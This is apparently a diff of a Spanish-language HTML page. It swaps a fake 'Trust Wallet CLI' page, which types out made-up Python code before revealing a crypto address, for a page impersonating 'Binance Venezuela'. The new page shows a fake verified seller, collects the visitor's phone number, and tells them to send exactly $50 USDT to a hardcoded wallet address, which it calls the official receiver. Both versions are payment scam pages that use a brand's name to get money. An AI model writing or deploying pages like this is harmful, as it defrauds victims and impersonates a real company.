@@ -2,167 +2,197 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Trust Wallet CLI</title>
+<title>Binance Venezuela | Centro P2P</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body {
-  margin: 0;
-  background: #050807;
-  font-family: monospace;
-  color: #7CFFB2;
-  overflow: hidden;
+body{
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(135deg,#070c1a,#121c34);
+    color:white;
 }
 
-/* Fondo hacker */
-.background {
-  position: fixed;
-  inset: 0;
-  background:
-    radial-gradient(circle at 30% 40%, rgba(0,255,150,0.05), transparent 60%),
-    radial-gradient(circle at 70% 60%, rgba(0,255,150,0.04), transparent 60%),
-    repeating-linear-gradient(
-      0deg,
-      rgba(0,255,150,0.02),
-      rgba(0,255,150,0.02) 1px,
-      transparent 1px,
-      transparent 3px
-    );
-  animation: drift 30s linear infinite;
+header{
+    background:#0a1024;
+    padding:20px;
+    text-align:center;
+    border-bottom:2px solid #1f2a44;
 }
 
-@keyframes drift {
-  0% {background-position: 0 0, 0 0, 0 0;}
-  100% {background-position: 400px 200px, -300px -200px, 0 200px;}
+header h1{
+    margin:0;
+    color:#f0b90b;
 }
 
-.terminal {
-  position: relative;
-  z-index: 2;
-  max-width: 900px;
-  margin: 40px auto;
-  padding: 20px;
-  background: rgba(2,4,3,0.9);
-  border: 1px solid #2b4f3d;
-  box-shadow: 0 0 40px rgba(124,255,178,0.1);
-  border-radius: 8px;
+.container{
+    max-width:650px;
+    margin:40px auto;
+    background:#0e1730;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 0 30px rgba(0,0,0,0.6);
 }
 
-h1 {
-  text-align: center;
-  font-weight: normal;
-  color: #7CFFB2;
-  margin-bottom: 10px;
+.profile{
+    display:flex;
+    align-items:center;
+    background:#050a18;
+    padding:15px;
+    border-radius:12px;
+    margin-bottom:20px;
 }
 
-input {
-  width: 100%;
-  padding: 12px;
-  background: #020403;
-  border: 1px solid #2b4f3d;
-  color: #7CFFB2;
+.avatar{
+    width:50px;
+    height:50px;
+    border-radius:50%;
+    background:#1f2a44;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:bold;
+    font-size:20px;
+    color:#f0b90b;
 }
 
-button {
-  width: 100%;
-  margin-top: 10px;
-  padding: 12px;
-  background: #11251c;
-  color: #7CFFB2;
-  border: 1px solid #2b4f3d;
-  cursor: pointer;
+.profile-info{
+    margin-left:15px;
 }
 
-button:hover {
-  background: #163528;
+.name{
+    font-size:18px;
+    font-weight:bold;
 }
 
-#output {
-  margin-top: 15px;
-  background: #020403;
-  border: 1px solid #2b4f3d;
-  padding: 10px;
-  min-height: 260px;
-  overflow-y: auto;
-  white-space: pre;
+.verified{
+    font-size:13px;
+    color:#00ff99;
 }
+
+label{
+    display:block;
+    margin-top:15px;
+    color:#bbb;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:8px;
+    margin-top:5px;
+    background:#050a18;
+    color:white;
+    font-size:15px;
+}
+
+input.locked{
+    background:#2a2a2a;
+    color:#888;
+}
+
+button{
+    width:100%;
+    margin-top:20px;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:#f0b90b;
+    color:#000;
+    font-weight:bold;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.amount{
+    text-align:center;
+    font-size:36px;
+    color:#00ff99;
+    margin-top:25px;
+}
+
+.wallet-box{
+    background:#050a18;
+    padding:18px;
+    border-radius:10px;
+    word-break:break-all;
+    border:1px solid #1f2a44;
+    margin-top:15px;
+}
+
+.copy-btn{
+    margin-top:10px;
+    background:#1f2a44;
+    color:white;
+}
+
+.info{
+    margin-top:20px;
+    font-size:13px;
+    color:#bbb;
+}
+
+.star{color:#f0b90b;}
+.footer{text-align:center;color:#777;font-size:12px;margin-top:30px;}
 </style>
 </head>
-
 <body>
 
-<div class="background"></div>
+<header>
+    <h1>Binance Venezuela</h1>
+    <p>Centro de Compra P2P</p>
+</header>
 
-<div class="terminal">
-<h1>Trust Wallet · Crypto Node CLI</h1>
+<div class="container">
 
-<input id="wallet" placeholder="wallet address">
+<!-- PERFIL DEL VENDEDOR -->
+<div class="profile">
+    <div class="avatar">B</div>
+    <div class="profile-info">
+        <div class="name">Binance Capital VE</div>
+        <div class="verified">✔ Vendedor verificado</div>
+    </div>
+</div>
 
-<button onclick="connect()">connect</button>
+<label>Número de Teléfono</label>
+<input id="phone" placeholder="+58 412 0000000">
 
-<div id="output"></div>
+<button onclick="lockPhone()">LISTO</button>
 
-<button onclick="copyText()">copy output</button>
+<div class="amount">$50 USD</div>
+<p style="text-align:center;color:#aaa;">Enviar exactamente este monto</p>
+
+<div class="wallet-box" id="wallet">
+0xb6ce6195cc7ab29f7ae89f78e0c725d50eab4dfb
+</div>
+
+<button class="copy-btn" onclick="copyWallet()">Copiar dirección</button>
+
+<div class="info">
+<span class="star">*</span> Enviar desde Binance a esta dirección.<br>
+<span class="star">*</span> Red: <b>TRC20 (USDT)</b>.<br>
+<span class="star">*</span> El vendedor mostrado es el receptor oficial.
+</div>
+
+</div>
+
+<div class="footer">
+© 2026 Binance Venezuela Gateway
 </div>
 
 <script>
-const pythonLines = [
-"import trustwallet",
-"import blockchain",
-"import crypto_engine",
-"",
-"node = blockchain.connect('trustwallet.mainnet')",
-"wallet = trustwallet.load_wallet(user_input)",
-"",
-"def verify_wallet(wallet):",
-"    return wallet.checksum() == True",
-"",
-"def open_session(node, wallet):",
-"    session = node.create_session(wallet)",
-"    return session",
-"",
-"print('connecting to trust wallet...')",
-"node.ping()",
-"node.handshake()",
-"",
-"wallet.validate()",
-"wallet.sync()",
-"",
-"session = open_session(node, wallet)",
-"session.encrypt()",
-"session.authorize()",
-"",
-"print('wallet connected')"
-];
-
-const finalText = `0xb6ce6195cc7ab29f7ae89f78e0c725d50eab4dfb`;
-
-function connect() {
-  const out = document.getElementById("output");
-  out.innerText = "";
-  let i = 0;
-
-  function typeLine() {
-    if (i < pythonLines.length) {
-      out.innerText += pythonLines[i] + "\n";
-      out.scrollTop = out.scrollHeight;
-      i++;
-
-      // velocidad humana (Termux-style)
-      let speed = Math.random() * 400 + 150;
-      setTimeout(typeLine, speed);
-    } else {
-      setTimeout(() => {
-        out.innerText += "\n" + finalText;
-      }, 800);
-    }
-  }
-
-  typeLine();
+function copyWallet(){
+    const w = document.getElementById("wallet").innerText;
+    navigator.clipboard.writeText(w);
+    alert("Dirección copiada. Envíe $50 desde Binance.");
 }
 
-function copyText() {
-  navigator.clipboard.writeText(finalText);
-  alert("Output copied");
+function lockPhone(){
+    const p = document.getElementById("phone");
+    p.readOnly = true;
+    p.classList.add("locked");
+    alert("Número confirmado.");
 }
 </script>
 
